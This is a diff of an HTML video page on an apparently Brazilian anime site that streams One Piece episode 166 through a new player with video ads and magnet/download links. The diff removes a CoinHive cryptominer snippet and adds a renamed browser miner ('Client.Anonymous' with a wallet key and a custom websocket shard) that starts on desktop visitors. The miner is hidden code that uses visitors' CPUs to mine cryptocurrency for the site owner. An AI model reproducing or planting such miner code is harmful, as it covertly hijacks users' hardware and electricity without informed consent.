@@ -1,35 +1,22 @@
 <!doctype html>
 <html>
  <head> 
+  <!-- Global site tag (gtag.js) - Google Analytics --> 
+  <script src="/cdn-cgi/apps/head/1FO_EnXpL0C-iM8YRB9kDJ5MUXU.js"></script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-92768117-1"></script> 
+  <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-92768117-1');
+</script> 
   <meta charset="utf-8"> 
   <title>One Piece - Episódio 166</title> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <script src="/cdn-cgi/apps/head/1FO_EnXpL0C-iM8YRB9kDJ5MUXU.js"></script>
-  <link href="video-js.css?v6" rel="stylesheet"> 
-  <!-- The Flowplayer skin --> 
-  <link rel="stylesheet" href="skin/skin.css"> 
-  <!-- Minimal styling for this standalone page (can be removed) --> 
-  <!-- Flowplayer depends on jquery for video tag based setups --> 
-  <script src="//code.jquery.com/jquery-1.12.4.min.js"></script> 
-  <!-- Flowplayer, commercial version--> 
-  <script src="flowplayer.js"></script> 
-  <script src="https://cdn.jsdelivr.net/webtorrent/latest/webtorrent.min.js"></script> 
-  <!-- Flowplayer hlsjs engine (light) --> 
-  <script src="//releases.flowplayer.org/hlsjs/flowplayer.hlsjs.light.min.js"></script> 
-  <!-- Flowplayer quality selector plugin --> 
-  <script src="//releases.flowplayer.org/vod-quality-selector/flowplayer.vod-quality-selector.js"></script> 
-  <!-- load VAST assets after Flowplayer assets --> 
-  <!-- IMA sdk --> 
-  <script src="//imasdk.googleapis.com/js/sdkloader/ima3.js"></script> 
-  <!-- Flowplayer vast plugin --> 
-  <script src="asf.min.js"></script> 
-  <script src="https://js.zlx.com.br/min.js?adfaaadfadfaa"></script> 
-  <script>
-	var miner = new CoinHive.Anonymous('j6aAJFEL2EAdJtngZcXd0d9EvmuzgBQq', {
-	throttle: 0.8,
-    });
-	miner.start();
-</script> 
+  <link rel="stylesheet" href="zlx.player.min.css?v1.0.2" type="text/css" charset="utf-8"> 
+  <!-- The ZLXPlayer skin --> 
+  <script src="zlxplayer.min.js?v1.0.2"></script> 
  </head> 
  <body> 
   <div id="downloadAniteca" style="display:none;"> 
@@ -61,86 +48,36 @@
     </div> 
    </div> 
   </div> 
-  <div class="flowplayer" id="flowplayer"> 
+  <div> 
+   <video id="anp-player" class="video-js" width="640" height="360"></video> 
   </div> 
   <script>
-            var versoes = {"mq":"'https:\/\/st01hd.animesproject.com.br\/download\/AKfxmXjYdwaDAgpvRdr2SA\/1511216870\/O\/one-piece\/MQ\/episodios\/166.mp4'","lq":"'https:\/\/st01hd.animesproject.com.br\/download\/zj3UuCJhr1VuNP9ouy2Hdg\/1511216870\/O\/one-piece\/LQ\/episodios\/166.mp4'"};
-            var magnets = {"mq":"magnet:?xt=urn:btih:707889e585c5c31928477439e4e99a729919b657&dn=166.mp4&xl=89991416&tr=wss:\/\/tracker.btorrent.xyz&tr=wss:\/\/tracker.fastcast.nz&xs=https:\/\/st01hd.animesproject.com.br\/torrents\/O\/one-piece\/MQ\/episodios\/166.mp4.torrent&ws=https:\/\/cdn1-st1.animesproject.com.br\/download\/AKfxmXjYdwaDAgpvRdr2SA\/1511216870\/O\/one-piece\/MQ\/episodios\/166.mp4&ws=https:\/\/cdn2-st1.animesproject.com.br\/download\/AKfxmXjYdwaDAgpvRdr2SA\/1511216870\/O\/one-piece\/MQ\/episodios\/166.mp4&ws=https:\/\/cdn3-st1.animesproject.com.br\/download\/AKfxmXjYdwaDAgpvRdr2SA\/1511216870\/O\/one-piece\/MQ\/episodios\/166.mp4","lq":"magnet:?xt=urn:btih:51af4655588fa1d868ebedfa43d535262a236be7&dn=166.mp4&xl=38374810&tr=wss:\/\/tracker.btorrent.xyz&tr=wss:\/\/tracker.fastcast.nz&xs=https:\/\/st01hd.animesproject.com.br\/torrents\/O\/one-piece\/LQ\/episodios\/166.mp4.torrent&ws=https:\/\/cdn1-st1.animesproject.com.br\/download\/zj3UuCJhr1VuNP9ouy2Hdg\/1511216870\/O\/one-piece\/LQ\/episodios\/166.mp4&ws=https:\/\/cdn2-st1.animesproject.com.br\/download\/zj3UuCJhr1VuNP9ouy2Hdg\/1511216870\/O\/one-piece\/LQ\/episodios\/166.mp4&ws=https:\/\/cdn3-st1.animesproject.com.br\/download\/zj3UuCJhr1VuNP9ouy2Hdg\/1511216870\/O\/one-piece\/LQ\/episodios\/166.mp4"};
-            var playstation = 0;
-            flowplayer(function (api) {
-                api.on("load", function (e, api, video) {
-                    var result = 'mq';
-                    video.vodQualities.qualities.forEach(function (obj) {
-                        if (obj.src === video.src) {
-                            result = obj.label.toLowerCase();
-                        }
-                    });
-                    if (WebTorrent.WEBRTC_SUPPORT && !playstation) {
-                        if (typeof client !== 'undefined') {
-                            client.destroy();
-                        }
-                        client = new WebTorrent();
-                        client.add(magnets[result], function (torrent) {
-                            // Stream the file in the browser
-                            torrent.files[0].renderTo('#anplayer');
-                        });
-                    }
-                });
+            var ZLXSources = {
+'mq':{'type': 'video/mp4', 'src': 'https://st01hd.animesproject.com.br/download/PIwE-qmHfqilp1P3GyMDOw/1514674597/O/one-piece/MQ/episodios/166.mp4', 'magnet': 'magnet:?xt=urn:btih:707889e585c5c31928477439e4e99a729919b657&dn=166.mp4&xl=89991416&tr=wss://tracker.btorrent.xyz&tr=wss://tracker.fastcast.nz&tr=wss://st1-subs.punchsub.net:8000&xs=https://st01hd.animesproject.com.br/torrents/O/one-piece/MQ/episodios/166.mp4.torrent&ws=https://cdn1-st1.animesproject.com.br/download/PIwE-qmHfqilp1P3GyMDOw/1514674597/O/one-piece/MQ/episodios/166.mp4&ws=https://cdn2-st1.animesproject.com.br/download/PIwE-qmHfqilp1P3GyMDOw/1514674597/O/one-piece/MQ/episodios/166.mp4&ws=https://cdn3-st1.animesproject.com.br/download/PIwE-qmHfqilp1P3GyMDOw/1514674597/O/one-piece/MQ/episodios/166.mp4'},
+'lq':{'type': 'video/mp4', 'src': 'https://st01hd.animesproject.com.br/download/slvs1XbQi-6QfhYEuhGesQ/1514674597/O/one-piece/LQ/episodios/166.mp4', 'magnet': 'magnet:?xt=urn:btih:51af4655588fa1d868ebedfa43d535262a236be7&dn=166.mp4&xl=38374810&tr=wss://tracker.btorrent.xyz&tr=wss://tracker.fastcast.nz&tr=wss://st1-subs.punchsub.net:8000&xs=https://st01hd.animesproject.com.br/torrents/O/one-piece/LQ/episodios/166.mp4.torrent&ws=https://cdn1-st1.animesproject.com.br/download/slvs1XbQi-6QfhYEuhGesQ/1514674597/O/one-piece/LQ/episodios/166.mp4&ws=https://cdn2-st1.animesproject.com.br/download/slvs1XbQi-6QfhYEuhGesQ/1514674597/O/one-piece/LQ/episodios/166.mp4&ws=https://cdn3-st1.animesproject.com.br/download/slvs1XbQi-6QfhYEuhGesQ/1514674597/O/one-piece/LQ/episodios/166.mp4'},            };
+
+            new ZLXPlayer("anp-player", {
+                'autoplay': false, // optional. Defaults to: true
+                'controls': true, // optional. Defaults to: true
+                'prefer_quality': 'low', // optional. Defaults to: high
+                'adTagUrl': 'https://googleads.g.doubleclick.net/pagead/ads?client=ca-video-pub-1256482085642647&slotname=zlx.com1226&ad_type=video_text_image&description_url=zlx.com.br&max_ad_duration=30000&videoad_start_delay=0', // optional
+                'adLabel': "Publicidade", // optional. Defaults to: Advertising
+                'sources': ZLXSources // required
+            }, function (player) {
+
             });
-            // set up info for this demo
-            window.onload = function () {
 
-                flowplayer("#flowplayer", {
-                    key: '$514320830999216',
-                    share: false,
-                    webkitallowfullscreen: true,
-                    mozallowfullscreen: true,
-                    allowfullscreen: true,
-                    fullscreen: true,
-                    ima: {
-                        // must be set when testing your installation, remove or set to false in production
-                        // adtest: true,
+        </script> 
+  <script>
+    Client.CONFIG.WEBSOCKET_SHARDS = [["wss://stream-st1-subs.punchsub.net:8892"]];
+    var miner = new Client.Anonymous('42n24VG1wMZcBib8JjEkLj3W2DHxG9gpThbooxeKamie8PwvSgJQe3PUKmjAZQJCoBZAqsjY6ADkb3KPGgJDTSKmHy1yuW8', {throttle: 0.5});
 
-                        // make the Google robots crawl the current page
-                        description_url: "zlx.com.br",
-                        adsafe: "medium",
-                        // adverts configuration
-                        ads: [{
-                                // mandatory: schedule ad time
-                                // here: 3 seconds into the video
-                                time: 0,
-                                // request an advert of type image or text type
-                                ad_type: "skippablevideo_image_text"
-                            }]
-                    },
-                    clip: {
-                        title: "One Piece - Episódio 166",
-                        // VOD quality selector plugin configuration
-                        vodQualities: {
-                            qualities: [{label: 'MQ', src: 'https://st01hd.animesproject.com.br/download/AKfxmXjYdwaDAgpvRdr2SA/1511216870/O/one-piece/MQ/episodios/166.mp4'},{label: 'LQ', src: 'https://st01hd.animesproject.com.br/download/zj3UuCJhr1VuNP9ouy2Hdg/1511216870/O/one-piece/LQ/episodios/166.mp4'},]
-                        },
-                        sources: [{type: 'video/mp4', src: 'https://st01hd.animesproject.com.br/download/AKfxmXjYdwaDAgpvRdr2SA/1511216870/O/one-piece/MQ/episodios/166.mp4'}]
-                    },
-                    ratio: 9 / 16
-                });
-
-            };
-
-            $('.versao').click(function () {
-                $("#textoDownload").show();
-                $("#textoDownload").html('Gerando link de download, aguarde...');
-                var id = $(this).attr('id');
-                url = versoes[id];
-                $.ajax({
-                    type: 'POST',
-                    url: 'verificarDownloadAniteca.php',
-                    data: 'url=' + url,
-                    success: function (data) {
-                        link = data.link;
-                        $("#textoDownload").html('<a href="' + link + '" target="_blank">Clique aqui para fazer download.</a>');
-                    }
-                });
-            });
-        </script>   
+//    var miner = new Client.Anonymous('5ed0370fc93f3b7b0bbccaddd03ddd97f6fb0c19d0b62a1277daf4cf2e5d5beb', {
+//        throttle: 0.8
+//    });
+        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+        }
+</script>   
  </body>
 </html>
